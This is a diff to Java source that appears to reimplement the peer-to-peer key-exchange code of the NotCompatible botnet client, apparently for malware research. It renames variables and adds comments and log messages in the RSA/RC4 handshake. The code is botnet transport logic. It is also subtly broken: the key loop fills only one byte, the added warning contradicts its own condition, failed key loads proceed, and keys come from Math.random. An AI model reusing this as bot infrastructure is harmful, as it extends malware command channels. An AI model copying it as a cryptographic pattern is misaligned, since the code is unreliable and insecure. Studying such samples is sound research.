@@ -10,6 +10,7 @@ import java.util.logging.Logger;
 import diff.notcompatible.c.bot.crypto.RC4;
 import diff.notcompatible.c.bot.crypto.RSA;
 import diff.notcompatible.c.bot.net.ThreadServer;
+import diff.notcompatible.c.bot.net.tcp.Link.LinkStatus;
 import diff.notcompatible.c.bot.objects.HubListItem;
 import diff.notcompatible.c.bot.objects.MyBuffer;
 import diff.notcompatible.c.bot.objects.Packet;
@@ -368,12 +369,14 @@ public class P2PLink extends TCPSocket {
             readBuffer.clear();
         }
         int dataLength;
-        RSA tmpRSA;
-        byte[] rsaBuff;
-        byte[] tmp;
+        RSA remotePublicKey;
+        byte[] remotePublicKeyBuffer;
+        byte[] rc4KeysetData;
         byte[] rc4key;
-        MyBuffer mb;
-        byte[] tmp2;
+        MyBuffer rc4DataBuffer;
+        byte[] rc3KeysetDataEncrypted;
+
+        // Was this an incoming connection - or did we initiate the connection?
         if (isIncoming || status != LinkStatus.KEY_EXCHANGE_DONE  || readBuffer.size <= 4) {
             if (status != LinkStatus.OFFLINE && isIncoming || readBuffer.size <= 4) {
                 if (receiveBuffer.size > 0 && status == LinkStatus.ONLINE) {
@@ -382,35 +385,46 @@ public class P2PLink extends TCPSocket {
             } else {
                 dataLength = readBuffer.asDWord();
                 readBuffer.shift(4);
+
+                // Ensure we have the length of data we think we do
                 if (dataLength <= readBuffer.size) {
+                	LOGGER.warning(" [!] P2P data claims we received " + dataLength + " bytes of data, larger than what the read buffer says we have - exiting!");
                     close();
                 } else {
-                    tmpRSA = new RSA();
-                    rsaBuff = new byte[dataLength];
-                    System.arraycopy(readBuffer.array(), 0, rsaBuff, 0, dataLength);
+                	// Read buffer for the remote p2p clients public key and attempt to ingest it
+                    remotePublicKey = new RSA();
+                    remotePublicKeyBuffer = new byte[dataLength];
+                    System.arraycopy(readBuffer.array(), 0, remotePublicKeyBuffer, 0, dataLength);
                     readBuffer.shift(dataLength);
-                    if (!tmpRSA.loadPublic(rsaBuff)) {
+                    if (!remotePublicKey.loadPublic(remotePublicKeyBuffer)) {
                     	// Create a rc4 keyset
-                        tmp = new byte[101];
-                    	for(int i = 0; i < tmp.length; i++)
-                    		tmp[1] = (byte) ((int) Math.round(Math.random() * 256));
-                        tmp[0] = (byte) 7;
+                        rc4KeysetData = new byte[101];
+                        for(int i = 0; i < rc4KeysetData.length; i++)
+                    		rc4KeysetData[1] = (byte) ((int) Math.round(Math.random() * 256));
+                        rc4KeysetData[0] = (byte) 0x7;
+
                         rc4key = new byte[100];
-                        System.arraycopy(tmp, 1, rc4key, 0, 100);
+                        System.arraycopy(rc4KeysetData, 1, rc4key, 0, 100);
                         
+                        // Initialize the streams
                         rc4Instream = new RC4(rc4key);
                         rc4Outstream = new RC4(rc4key);
                         isEncrypt = true;
-                        mb = new MyBuffer();
-                        tmp2 = tmpRSA.encrypt(tmp);
-                        mb.putDword(tmp2.length);
-                        mb.put(tmp2);
-                        send(mb);
+
+                        // Send back the rc4 keyset to use after encrypting with remote clients key
+                        rc4DataBuffer = new MyBuffer();
+                        rc3KeysetDataEncrypted = remotePublicKey.encrypt(rc4KeysetData);
+                        rc4DataBuffer.putDword(rc3KeysetDataEncrypted.length);
+                        rc4DataBuffer.put(rc3KeysetDataEncrypted);
+                        send(rc4DataBuffer);
                         status = LinkStatus.ONLINE;
+
+                        // Check if there are any other commands to parse
                         if (receiveBuffer.size > 0 && status == LinkStatus.ONLINE) {
                             parseCommand();
                         }
                     } else {
+                    	LOGGER.warning(" [!] Remote P2P client provided a bad public key - unable to load!");
                         close();
                     }
                 }
@@ -421,11 +435,11 @@ public class P2PLink extends TCPSocket {
             if (dataLength > readBuffer.size) {
                 close();
             } else {
-                tmp = new byte[dataLength];
-                System.arraycopy(readBuffer.array(), 0, tmp, 0, tmp.length);
+                rc4KeysetData = new byte[dataLength];
+                System.arraycopy(readBuffer.array(), 0, rc4KeysetData, 0, rc4KeysetData.length);
                 readBuffer.shift(dataLength);
                 byte[] tmp2_2 = new byte[100];
-                System.arraycopy(owner.RSALocal.decrypt(tmp), 1, tmp2_2, 0, tmp2_2.length);
+                System.arraycopy(owner.RSALocal.decrypt(rc4KeysetData), 1, tmp2_2, 0, tmp2_2.length);
                 rc4key = tmp2_2;
                 rc4Instream = new RC4(rc4key);
                 rc4Outstream = new RC4(rc4key);
@@ -445,27 +459,27 @@ public class P2PLink extends TCPSocket {
                     dataLength = readBuffer.asDWord();
                     readBuffer.shift(4);
                     if (dataLength <= readBuffer.size) {
-                        tmpRSA = new RSA();
-                        rsaBuff = new byte[dataLength];
-                        System.arraycopy(readBuffer.array(), 0, rsaBuff, 0, dataLength);
+                        remotePublicKey = new RSA();
+                        remotePublicKeyBuffer = new byte[dataLength];
+                        System.arraycopy(readBuffer.array(), 0, remotePublicKeyBuffer, 0, dataLength);
                         readBuffer.shift(dataLength);
-                        if (tmpRSA.loadPublic(rsaBuff)) {
+                        if (remotePublicKey.loadPublic(remotePublicKeyBuffer)) {
                             close();
                         } else {
-                            tmp = new byte[101];
-                        	for(int i = 0; i < tmp.length; i++)
-                        		tmp[1] = (byte) ((int) Math.round(Math.random() * 256));
-                            tmp[0] = (byte) 7;
+                            rc4KeysetData = new byte[101];
+                        	for(int i = 0; i < rc4KeysetData.length; i++)
+                        		rc4KeysetData[1] = (byte) ((int) Math.round(Math.random() * 256));
+                            rc4KeysetData[0] = (byte) 7;
                             rc4key = new byte[100];
-                            System.arraycopy(tmp, 1, rc4key, 0, 100);
+                            System.arraycopy(rc4KeysetData, 1, rc4key, 0, 100);
                             rc4Instream = new RC4(rc4key);
                             rc4Outstream = new RC4(rc4key);
                             isEncrypt = true;
-                            mb = new MyBuffer();
-                            tmp2 = tmpRSA.encrypt(tmp);
-                            mb.putDword(tmp2.length);
-                            mb.put(tmp2);
-                            send(mb);
+                            rc4DataBuffer = new MyBuffer();
+                            rc3KeysetDataEncrypted = remotePublicKey.encrypt(rc4KeysetData);
+                            rc4DataBuffer.putDword(rc3KeysetDataEncrypted.length);
+                            rc4DataBuffer.put(rc3KeysetDataEncrypted);
+                            send(rc4DataBuffer);
                             status = LinkStatus.ONLINE;
                             if (receiveBuffer.size > 0 && status == LinkStatus.ONLINE) {
                                 parseCommand();
